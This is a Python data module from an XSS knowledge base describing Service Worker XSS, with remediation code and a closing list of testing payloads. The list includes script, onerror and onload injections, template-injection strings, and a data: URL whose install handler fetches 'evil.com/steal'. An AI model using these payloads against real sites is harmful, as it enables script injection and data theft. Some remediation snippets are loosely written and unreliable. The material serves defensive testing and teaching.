#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

Service Worker XSS Context - Data Module
Contains description and remediation data
"""

DESCRIPTION = """
Service Worker XSS occurs when user input is reflected into Service Worker scripts without proper
sanitization. Service Workers are background scripts that run independently of web pages, intercepting
network requests, caching resources, and providing offline functionality. When malicious code is
injected into Service Worker scripts, it can execute with elevated privileges and persist across
browser sessions.

VULNERABILITY CONTEXT:
Service Worker XSS typically happens when:
1. Dynamic Service Worker registration with user-controlled URLs
2. Service Worker scripts generated from user templates
3. Cache manipulation with malicious responses
4. Push notification content injection
5. Background sync data manipulation
6. Offline page generation with user content

Common in:
- Progressive Web Apps (PWA)
- Offline-first applications
- Caching layers
- Push notification systems
- Background synchronization
- Template-based applications
- CDN configurations
- Mobile applications

SEVERITY: HIGH
Service Workers run in the background with elevated privileges, can intercept all network requests,
manipulate cache, and persist malicious code across browser sessions and even offline usage.
"""

REMEDIATION = """
SERVICE WORKER XSS DEFENSE STRATEGY:

1. SERVICE WORKER URL VALIDATION (PRIMARY DEFENSE):
   Validate Service Worker registration URLs:

   JavaScript validation:
   function isValidServiceWorkerUrl(url) {
     const allowedDomains = ['yourdomain.com', 'cdn.yourdomain.com'];
     const allowedPaths = ['/sw.js', '/service-worker.js'];

     try {
       const urlObj = new URL(url, location.origin);
       return allowedDomains.includes(urlObj.hostname) &&
              allowedPaths.includes(urlObj.pathname);
     } catch {
       return false;
     }
   }

2. DYNAMIC SERVICE WORKER RESTRICTIONS:
   Avoid dynamic Service Worker registration with user input:

   // BAD - Vulnerable to injection
   navigator.serviceWorker.register(userInput);

   // GOOD - Static registration
   navigator.serviceWorker.register('/static/sw.js');

3. SERVICE WORKER SCRIPT SANITIZATION:
   Sanitize Service Worker script content:

   const DOMPurify = require('dompurify');
   const cleanScript = DOMPurify.sanitize(scriptContent, {
     ALLOWED_TAGS: [],
     ALLOWED_ATTR: []
   });

4. CACHE CONTENT VALIDATION:
   Validate cached content before serving:

   self.addEventListener('fetch', function(event) {
     event.respondWith(
       caches.match(event.request).then(function(response) {
         if (response) {
           return response.text().then(function(text) {
             // Validate cached content
             const cleanText = DOMPurify.sanitize(text);
             return new Response(cleanText, response);
           });
         }
         return fetch(event.request);
       })
     );
   });

5. PUSH NOTIFICATION SANITIZATION:
   Sanitize push notification content:

   self.addEventListener('push', function(event) {
     const data = event.data.json();
     const cleanBody = DOMPurify.sanitize(data.body);

     const options = {
       body: cleanBody,
       icon: validateUrl(data.icon),
       badge: validateUrl(data.badge)
     };
   });

6. BACKGROUND SYNC VALIDATION:
   Validate background sync data:

   self.addEventListener('sync', function(event) {
     event.waitUntil(
       validateAndProcessData(event.tag)
     );
   });

   function validateAndProcessData(tag) {
     return new Promise(function(resolve, reject) {
       // Validate sync data before processing
       const cleanData = DOMPurify.sanitize(syncData);
       // Process only validated data
       resolve(cleanData);
     });
   }

7. MESSAGE VALIDATION:
   Validate messages between page and Service Worker:

   self.addEventListener('message', function(event) {
     const data = event.data;

     // Validate message structure and content
     if (isValidMessage(data)) {
       processMessage(data);
     }
   });

   function isValidMessage(data) {
     // Strict validation of message structure
     return typeof data === 'object' &&
            data.type in ALLOWED_MESSAGE_TYPES &&
            typeof data.content === 'string' &&
            data.content.length < 1000;
   }

8. SCOPE RESTRICTIONS:
   Limit Service Worker scope:

   navigator.serviceWorker.register('/sw.js', {
     scope: '/app/'  // Restrict to specific path
   });

9. UPDATE VALIDATION:
   Validate Service Worker updates:

   self.addEventListener('install', function(event) {
     self.skipWaiting();  // Only if update is validated
   });

10. CLIENT VERIFICATION:
    Verify client origins:

    clients.matchAll().then(function(clients) {
      clients.forEach(function(client) {
        if (!isAllowedOrigin(client.url)) {
          client.close();  // Close unauthorized clients
        }
      });
    });

11. OFFLINE CONTENT SANITIZATION:
    Sanitize offline page content:

    self.addEventListener('fetch', function(event) {
      if (event.request.mode === 'navigate') {
        event.respondWith(
          caches.match('/offline.html').then(function(response) {
            return response.text().then(function(text) {
              const cleanText = DOMPurify.sanitize(text);
              return new Response(cleanText, {
                headers: {'Content-Type': 'text/html'}
              });
            });
          })
        );
      }
    });

12. CSP FOR SERVICE WORKERS:
    Content Security Policy restrictions:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      connect-src 'self';
      object-src 'none';
      worker-src 'self';

13. SERVICE WORKER DESTRUCTION:
    Proper cleanup on logout:

    navigator.serviceWorker.getRegistration().then(function(registration) {
      if (registration) {
        registration.unregister().then(function(success) {
          if (success) {
            // Clear all caches
            caches.keys().then(function(names) {
              names.forEach(function(name) {
                caches.delete(name);
              });
            });
          }
        });
      }
    });

14. MONITORING AND LOGGING:
    Comprehensive Service Worker monitoring:

    self.addEventListener('install', function(event) {
      console.log('SW installing:', new Date().toISOString());
    });

    self.addEventListener('activate', function(event) {
      console.log('SW activating:', new Date().toISOString());
    });

15. VERSION CONTROL:
    Service Worker versioning:

    const CACHE_VERSION = 'v1.0.0';
    const CACHE_NAME = 'app-cache-' + CACHE_VERSION;

    self.addEventListener('install', function(event) {
      event.waitUntil(
        caches.open(CACHE_NAME).then(function(cache) {
          // Cache validation here
          return cache.addAll(VALIDATED_URLS);
        })
      );
    });

16. TESTING AND VALIDATION:
    Regular security testing:

    Automated tests:
    - Service Worker registration testing
    - Cache content validation
    - Offline functionality testing
    - Push notification security testing

    Manual testing:
    - DevTools Application tab inspection
    - Service Worker script analysis
    - Cache content verification
    - Offline behavior testing

SECURITY TESTING PAYLOADS:

Basic detection:
<script>alert('Service Worker XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Service Worker specific:
data:text/javascript,self.addEventListener('install',function(){fetch('http://evil.com/steal')})
data:text/javascript,eval('alert(1)')
data:text/html,<script>alert(1)</script>

Bypass attempts:
{{constructor.constructor('alert(1)')()}}
javascript:alert(1)
vbscript:msgbox(1)

SERVICE WORKER SECURITY HEADERS:

Service-Worker-Allowed: /app/
Cache-Control: no-cache
Content-Security-Policy: worker-src 'self'

MONITORING METRICS:

Track and alert on:
- Service Worker registration failures
- Cache corruption attempts
- Push notification abuse
- Background sync anomalies
- Message validation failures

OWASP REFERENCES:
- OWASP PWA Security
- OWASP Service Worker Security
- Service Workers 1 Specification
- Progressive Web Apps Security
"""
